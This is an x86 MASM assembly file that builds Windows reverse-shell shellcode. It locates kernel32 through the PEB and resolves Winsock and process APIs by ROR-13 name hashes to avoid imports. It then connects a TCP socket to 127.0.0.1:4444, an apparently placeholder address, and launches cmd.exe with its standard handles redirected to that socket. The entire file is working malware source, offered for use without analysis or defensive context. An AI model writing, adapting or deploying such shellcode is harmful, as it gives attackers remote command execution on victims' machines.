.486
.model flat,C
option casemap:none


include C:\masm32\include\windows.inc ;change the path to windows.inc path in your masm32 folder



.Const

;kernel32.dll functions hashes
LoadLibraryHash Equ 0EC0E4E8EH
CreateProcessaHASH Equ 16B3FE72H
WaitForSingleObjectHash Equ 0CE05D9ADH

;ws_32.dll functions hashes
WSASocketaHash Equ 0ADF509D9H
WSAStartupHash Equ 3BFCEDCBH
ConnectHash Equ 60AAF9ECH



Assume Fs:Nothing

.Code
start:
Main Proc
Local sinfo:STARTUPINFO
Local pinfo:PROCESS_INFORMATION
Local sockAdd:sockaddr_in
Local WsaData_variable:WSADATA
Local No_Of_Functions:DWord
Local NameFunctionsTable:DWord
Local OrdinalTable:DWord
Local AddressTable:DWord
;--------
Local WSAStartup:DWord
Local WsasocketA:DWord
Local Connect:DWord

Local WaitForSingleObject:DWord
Local CreateProcessA:DWord
Local Loadlibrary:DWord

;..................................................................................... Get kernel32.dll base address
Nop
kernel_base:
     Xor Ebx, Ebx
     Add Ebx, 30H
     Mov Eax, DWord Ptr Fs:[Ebx]
     Mov Eax, DWord Ptr [Eax + 0CH]
     Mov Eax, DWord Ptr [Eax + 14H] 
     Mov Ebx, DWord Ptr [Eax] ; ntdll
     Mov Eax, DWord Ptr [Ebx];kernel.dll
     Mov Eax, DWord Ptr [Eax + 10H] ;kernel32 base
;................................................................................................

SetParamsOfApiSearch:
Mov Ecx, 0FFFFFFFFH
Add Ecx, 4H ; Num functions apisearch to extract
Mov DWord Ptr [Loadlibrary - 4H], Ecx
Sub Ecx, 1H ; Num ofdlls to extract from
Mov DWord Ptr [Loadlibrary - 8H], Ecx

get_arrays:
    Mov Esi, Eax ; imageBase
    Mov Ebx, DWord Ptr [Esi + 3CH]
    Add Ebx, Esi ; ntheaders_va
    Mov Ebx, DWord Ptr [Ebx + 78H]
    Add Ebx, Esi ; image_export_directory_va
    Mov Edx, DWord Ptr [Ebx + 18H]
    Mov No_Of_Functions, Edx
    Mov Edx, DWord Ptr [Ebx + 1CH]
    Add Edx, Esi ;addresstable
    Mov AddressTable, Edx
    Mov Edx, DWord Ptr [Ebx + 20H]
    Add Edx, Esi ;NameFunctionsTables
    Mov NameFunctionsTable, Edx
    Mov Edx, DWord Ptr [Ebx + 24H]
    Add Edx, Esi ;OrdinalTable
    Lea Ecx, DWord Ptr [OrdinalTable + 4H]
    Mov DWord Ptr [Ecx - 4H], Edx


apiSearch:
Xor Ecx, Ecx ;counter
Mov Ebx, Eax ;imagebase
Mov Esi, NameFunctionsTable
continue:
Lodsd
Add Eax, Ebx ;address of function
Push Esi
Mov Esi, Eax
Xor Eax, Eax
Mov Edi, Eax
compute_hash:
Lodsb
Test Al, Al
Jz check_hash
; hash compute
Ror Edi, 0DH
Add Edi, Eax
Jmp compute_hash

check_hash:
Xor Eax, Eax
Cmp Edi, LoadLibraryHash
Jz found

Inc Eax
Cmp Edi, CreateProcessaHASH
Jz found

Inc Eax
Cmp Edi, WaitForSingleObjectHash
Jz found

Inc Eax
Cmp Edi, ConnectHash
Jz found


Inc Eax
Cmp Edi, WSASocketaHash
Jz found

Inc Eax
Cmp Edi, WSAStartupHash
Jz found
Jmp not_found



found:
Lea Edi, DWord Ptr [OrdinalTable + 4H]
Mov Edi, DWord Ptr [Edi - 4H]
Movzx Esi, Word Ptr [Edi + Ecx * 2]

Mov Edi, AddressTable
Mov Edi, DWord Ptr [Edi + Esi * 4]
Add Edi, Ebx

Lea Esi, Loadlibrary
Mov DWord Ptr [Esi + Eax * 4], Edi

Dec DWord Ptr [Esi - 4H]
Mov Eax, DWord Ptr [Esi - 4H]
Test Eax, Eax
Jz get_ws2_apis

not_found:
Inc Ecx
Cmp Ecx, No_Of_Functions
Jz get_ws2_apis
Pop Esi
Jmp continue

get_ws2_apis:
Dec DWord Ptr [Loadlibrary - 8H]
Mov Eax, DWord Ptr [Loadlibrary - 8H]
Test Eax, Eax
Jz Reverse_Shell
Mov Ecx, 0FFFFFFFFH
Add Ecx, 4H
Mov DWord Ptr [Loadlibrary - 4H], Ecx
Mov Eax, Loadlibrary
Xor Ecx, Ecx
Mov Cx, '23'
Push Ecx
Push '_2sw'
Push Esp ; ws2_32 string
Call Eax
Jmp get_arrays

Reverse_Shell:
Mov Eax, Loadlibrary
Xor Edx, Edx
Xor Ebx, Ebx
Mov Dx, 0202H ; version 2.2
Lea Eax, WsaData_variable
Push Eax
Push Edx
Call WSAStartup
;wsasocketA
Push Ebx
Push Ebx
Push Ebx
Push Ebx
Mov Edx, Ebx
Mov Dl, 1H ;SOCK_STREAM
Push Edx
Inc Dl ;AF_INET
Push Edx
Call WsasocketA
Mov Esi, Eax
Mov Dl, 2H
Mov sockAdd.sin_family, Dx
Mov Dx, 5C11H ; port = 4444 = 115ch in little indian
Mov sockAdd.sin_port, Dx
Mov Dl, 1H ; 4th byte in ip address in hexa
Shl Edx, 8
Mov Dl, Bl ; 3th byte in ip address in hexa bl=0
Shl Edx, 8
Mov Dl, Bl; 2nd byte in ip address in hexa
Shl Edx, 8
Mov Dl, 7fH; 1st byte in ip address
Mov sockAdd.sin_addr, Edx
Lea Edx, sockAdd
Push SizeOf sockAdd
Push Edx
Push Esi
Call Connect


Xor Eax, Eax
Xor Ecx, Ecx
Mov Cl, SizeOf sinfo
Lea Edi, sinfo
Rep Stosb
Mov Cl, SizeOf sinfo
Mov sinfo.cb, Ecx
Mov Cx, 101H
Mov sinfo.dwFlags, Ecx
Mov sinfo.hStdInput, Esi
Mov sinfo.hStdOutput, Esi
Mov sinfo.hStdError, Esi
Mov Al, 'D'
Push Eax
Mov Ax, 'MC'
Push Ax
Mov Esi, Esp
Lea Edi, pinfo
Push Edi ;ProcessInfo structure
Lea Edi, sinfo
Push Edi ;StartupInfo structure
Push Ebx;NULL
Push Ebx;NULL
Push Ebx;NULL
Lea Eax, DWord Ptr [Ebx + 1H]
Push Eax; TRUE
Push Ebx;NULL
Push Ebx;NULL
Push Esi
Push Ebx;NULL
Call CreateProcessA
Push INFINITE
Push pinfo.hProcess
Call WaitForSingleObject ; wait until process finish

Nop
Ret
Main EndP




End start
